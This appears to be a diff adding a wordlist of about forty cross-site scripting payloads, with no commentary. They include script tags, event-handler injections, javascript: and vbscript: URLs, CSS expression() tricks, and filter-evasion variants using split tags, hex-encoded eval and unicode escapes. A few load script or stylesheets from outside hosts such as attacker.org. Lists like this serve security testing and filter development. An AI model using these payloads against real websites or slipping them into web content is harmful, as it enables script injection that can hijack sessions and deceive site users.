@@ -1,0 +1,45 @@
+<a href%3d"javascript:alert('xss')">link</a>
+<img src%3d# onerror%3dalert(xss)> 
+<script>alert("XSS")</script>
+<script src%3djs></script>
+<a href%3djavascript:alert()>
+<style/onload%3dalert(1)>
+<script>alert(/xss/)</script> 
+<scri/**/pt>alert(/xss/)</sc/**/ript> 
+<script>alert('xss')</script> 
+<script>alert("xss");</script> 
+<script>alert("jdq") 
+<LINK REL%3d"stylesheet" HREF%3d"javascript:alert('XSS');">
+<iframe src%3djavascript:alert('xss');height%3d0 width%3d0 /><iframe>		
+<img src%3d"1" onerror%3deval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")></img>  
+onclick%3d"alert('xss') 	
+Onmousemove%3d"alert('xss') 
+<anytag onmouseover%3dalert(15)>
+<div style%3d"color:expression(alert('XSS'))">
+<a href%3d'vbscript:MsgBox("XSS")'>link</a>
+<button/onclick%3dalert(20)>
+<marquee onstart%3dalert(30)></marquee>
+<img src%3dx onerror%3dprompt(1);>
+<a onmouseover%3d"javascript:window.onerror%3dalert;throw 1">
+<img src%3dx onerror%3d"javascript:window.onerror%3dalert;throw 1">
+<script>eval(alert('xss')))</script>
+<input onmouseover%3dprompt(971874) >
+<input onfocus%3dprompt(123) >
+<input onclick%3dalert(123) >
+<input type%3dhidden style%3d`x:expression(alert(/xss/))`>   
+<input type%3d"hidden" accesskey%3d"X" onclick%3d"alert(/xss/)">
+<span  onclick%3d'alert(/xss/)' >span</span>
+<scr<script>ipt>alert("XSS")</scr<script>ipt>
+<LAYER src="http://xss.ha.ckers.org/a.js"></layer>
+<div onclick="alert('xss')">
+<div style="color: expression(alert('XSS'))">
+<style>@import url("http://attacker.org/malicious.css");</style>
+<style>malicious.css:body {    color:expression(alert('XSS'));}</style>
+<style>@imp\ort url("http://attacker.org/malicious.css");</style>
+<style>body { background-image: url('javascript:open("http://127.0.0.1/css.htm")') }</style>
+<style>body { background-image: url('javascript:document.write("<Iframe src=http://127.0.0.1/css.htm width=0 height=0></iframe>")') } </style>
+<a href="javascript:al\u0065rt(1)">ok</a>
+
+
+
+
